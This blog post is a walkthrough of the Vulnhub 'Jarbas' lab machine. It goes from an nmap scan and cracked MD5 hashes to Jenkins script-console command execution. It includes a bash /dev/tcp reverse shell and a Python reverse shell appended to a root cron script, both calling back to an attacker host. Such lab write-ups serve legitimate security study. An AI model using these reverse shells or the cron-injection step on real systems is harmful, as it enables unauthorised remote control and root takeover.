---
layout:     post
title:      "Vulnhub.com - Jarbas"
date:       2018-08-29 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

This time our goal is to attack another machine from Vulnhub called **Jarbas**. 

{% highlight text %}
If you want to keep your hacking studies, please try out this machine!

Jarbas 1.0 – A tribute to a nostalgic Brazilian search engine in the end of 90’s.

Objective: Get root shell!
{% endhighlight %}

* Author: [Tiago Tavares](https://twitter.com/tiagotvrs)
* Download: [https://www.vulnhub.com/entry/jarbas-1,232/](https://www.vulnhub.com/entry/jarbas-1,232/)

### Solution

Let's start with `nmap` scan. 

{% highlight text %}
root@kali:~# nmap -sC -sV -sS -A -v 10.0.0.17
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-27 06:49 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:49
Completed NSE at 06:49, 0.00s elapsed
Initiating NSE at 06:49
Completed NSE at 06:49, 0.00s elapsed
Initiating ARP Ping Scan at 06:49
Scanning 10.0.0.17 [1 port]
Completed ARP Ping Scan at 06:49, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:49
Completed Parallel DNS resolution of 1 host. at 06:49, 0.00s elapsed
Initiating SYN Stealth Scan at 06:49
Scanning 10.0.0.17 [1000 ports]
Discovered open port 22/tcp on 10.0.0.17
Discovered open port 3306/tcp on 10.0.0.17
Discovered open port 8080/tcp on 10.0.0.17
Discovered open port 80/tcp on 10.0.0.17
Completed SYN Stealth Scan at 06:49, 0.14s elapsed (1000 total ports)
Initiating Service scan at 06:49
Scanning 4 services on 10.0.0.17
Completed Service scan at 06:50, 6.47s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.17
NSE: Script scanning 10.0.0.17.
Initiating NSE at 06:50
Completed NSE at 06:50, 0.62s elapsed
Initiating NSE at 06:50
Completed NSE at 06:50, 0.00s elapsed
Nmap scan report for 10.0.0.17
Host is up (0.00052s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 28:bc:49:3c:6c:43:29:57:3c:b8:85:9a:6d:3c:16:3f (RSA)
|   256 a0:1b:90:2c:da:79:eb:8f:3b:14:de:bb:3f:d2:e7:3f (ECDSA)
|_  256 57:72:08:54:b7:56:ff:c3:e6:16:6f:97:cf:ae:7f:76 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Jarbas - O Seu Mordomo Virtual!
3306/tcp open  mysql   MariaDB (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 08:00:27:33:DB:AD (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 49.710 days (since Sun Jul  8 13:47:45 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 10.0.0.17

NSE: Script Post-scanning.
Initiating NSE at 06:50
Completed NSE at 06:50, 0.00s elapsed
Initiating NSE at 06:50
Completed NSE at 06:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.69 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.294KB)
{% endhighlight %}

From this scan, we can see a bunch of open ports, but we can start from the usual port `80` with `http` service. 

After visiting this website, we are presented with this old school looking page. 

![Main page](/img/jarbas/index.png){:class="img-responsive center-block"}

But I could not find anything useful, after which I decided to check another port `8080` with another `http` server. 

{% highlight text %}
root@kali:~# curl 10.0.0.17:8080
<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>


Authentication required
<!--
You are authenticated as: anonymous
Groups that you are in:
  
Permission you need to have (but didn't): hudson.model.Hudson.Read
 ... which is implied by: hudson.security.Permission.GenericRead
 ... which is implied by: hudson.model.Hudson.Administer
-->

</body></html>
{% endhighlight %}

From the source code, we can see that the websiite redirects to `/login?from=%2F` directory. Let's check that with the browser. 

![Jenkins login](/img/jarbas/jenkins-login.png){:class="img-responsive center-block"}

So we have information that the service running is `Jenkins` but apart from brute forcing credentials, we do not have any more information. 

After that I decided to check the `MariaDB` database hosted on port `3306`.

{% highlight text %}
root@kali:~# nc 10.0.0.17 3306
C�jHost '10.0.0.4' is not allowed to connect to this MariaDB server
{% endhighlight %}

Still, nothing there. At that point I decided to run a `gobuster` against web servers looking for directories, and then for files with `.php` or `.html` extensions.

{% highlight text %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -u http://10.0.0.17 -x .html,.php

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.0.0.17/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .html,.php
=====================================================
/index.html (Status: 200)
/access.html (Status: 200)
=====================================================
{% endhighlight %}

Here we have, first find! Let's look at `access.html`. 

{% highlight text %}
root@kali:~# curl 10.0.0.17/access.html
<html>
<title>New Agile version!</title>
<body>
<h2>
<p align=center> Creds encrypted in a safe way!</h2></p>
<p align=center> <img src="geoffrey.jpg" alt="Geoffrey"></p>
<p align=center> tiago:5978a63b4654c73c60fa24f836386d87<br>
trindade:f463f63616cb3f1e81ce46b39f882fd5<br>
eder:9b38e2b1e8b12f426b0d208a7ab6cb98<br>
</p>
</p> 
</body>
</html>
{% endhighlight %}

Cracking the hashes easily reveals all of them. 

{% highlight text %}
5978a63b4654c73c60fa24f836386d87	md5	italia99
f463f63616cb3f1e81ce46b39f882fd5	md5	marianna
9b38e2b1e8b12f426b0d208a7ab6cb98	md5	vipsu

tiago:italiana
trindadate:marianna
eder:vipsu
{% endhighlight %}

Now after trying these credentials, `eder` worked and we are logged into the `Jenkins`. 

![Jenkins Logged](/img/jarbas/jenkins-after-logged.png){:class="img-responsive center-block"}

But what can we do with it? There was a `/script/ directory allowing us to run any script we enter into the text box. 

I use code from [HighOnCoffe](https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/) blog, which will allow me to execute commands. 

{% highlight text %}
def command = "whoami"
def proc = command.execute()
proc.waitFor()              

println "Process exit code: ${proc.exitValue()}"
println "Std Err: ${proc.err.text}"
println "Std Out: ${proc.in.text}"

Result

Process exit code: 0
Std Err: 
Std Out: jenkins
{% endhighlight %}

We can see that the code executes, showing us `jenkins` as the output. I tried the same with `id` command. 

{% highlight text %}
Process exit code: 0
Std Err: 
Std Out: uid=997(jenkins) gid=995(jenkins) groups=995(jenkins) context=system_u:system_r:initrc_t:s0
{% endhighlight %}

Now we are sure that the commands are executed properly. My next step was to run some `Java Reverse Shell`. 

{% highlight text %}
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.4/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
{% endhighlight %}

And with our listener, we catch the connection. 

{% highlight text %}
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.17: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.17] 57184
whoami
jenkins
uname -a
Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
{% endhighlight %}

One thing I've noticed during usual enumeration is en entry in crontab, executing a bash script every 5 minutes with root privilages. 

{% highlight text %}
cat crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1

cat /etc/script/CleaningScript.sh
#!/bin/bash

rm -rf /var/log/httpd/access_log.txt
{% endhighlight %}

I decided to try and put into that script a Python reverse shell snippet, that will give us back a root shell. 

{% highlight text %}
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.4\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> CleaningScript.sh   
cat CleaningScript.sh
#!/bin/bash

rm -rf /var/log/httpd/access_log.txt
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}

Great, now let's set up a listener and wait for the new run of the script. 

{% highlight text %}
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
10.0.0.17: inverse host lookup failed: Unknown host
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.17] 57190
sh: no job control in this shell
sh-4.2# whoami
whoami
root


sh-4.2# cat flag.txt	
cat flag.txt
Hey!

Congratulations! You got it! I always knew you could do it!
This challenge was very easy, huh? =)

Thanks for appreciating this machine.

@tiagotvrs 
{% endhighlight %}